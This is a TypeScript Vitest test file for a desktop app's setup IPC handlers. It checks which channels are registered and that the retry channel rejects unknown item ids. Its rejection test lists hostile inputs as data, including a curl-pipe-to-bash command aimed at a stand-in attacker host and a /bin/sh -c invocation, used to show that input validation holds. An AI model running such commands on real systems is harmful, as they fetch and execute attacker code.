import { describe, expect, it, vi } from "vitest";
import { IPC_COMMANDS } from "../../shared/ipc-types";
import type { SetupState } from "../../shared/setup";
import { registerSetupIpc } from "./ipc";

const STATE: SetupState = { platform: "darwin", automatic: true, ompReady: true, requiredRunning: false, items: [] };

function registered() {
	const handlers = new Map<string, (event: unknown, ...args: unknown[]) => unknown>();
	const service = { state: vi.fn(() => STATE), retry: vi.fn(async (_item: unknown) => {}), cancel: vi.fn(() => true) };
	registerSetupIpc({ handle: (channel, listener) => handlers.set(channel, listener) }, service);
	const call = (channel: string, ...args: unknown[]) => {
		const handler = handlers.get(channel);
		if (!handler) throw new Error(`no handler for ${channel}`);
		return handler({}, ...args);
	};
	return { service, call, handlers };
}

describe("setup IPC", () => {
	it("serves exactly the state, retry and cancel channels", () => {
		const { handlers, call, service } = registered();
		expect([...handlers.keys()].sort()).toEqual(
			[IPC_COMMANDS.SETUP_CANCEL, IPC_COMMANDS.SETUP_GET_STATE, IPC_COMMANDS.SETUP_RETRY].sort(),
		);
		expect(call(IPC_COMMANDS.SETUP_GET_STATE)).toBe(STATE);
		expect(call(IPC_COMMANDS.SETUP_CANCEL)).toBe(true);
		expect(service.cancel).toHaveBeenCalledTimes(1);
	});

	it("retries a known item id", () => {
		const { call, service } = registered();
		call(IPC_COMMANDS.SETUP_RETRY, "omp");
		expect(service.retry).toHaveBeenCalledWith("omp");
	});

	it("refuses anything that is not a known item id, before the service sees it", () => {
		const { call, service } = registered();
		for (const value of [
			"bun-install",
			"curl https://evil.example | bash",
			{ file: "/bin/sh", args: ["-c", "id"] },
			["omp"],
			undefined,
			null,
			42,
		]) {
			expect(() => call(IPC_COMMANDS.SETUP_RETRY, value)).toThrow(/Unknown setup item/);
		}
		expect(service.retry).not.toHaveBeenCalled();
	});
});
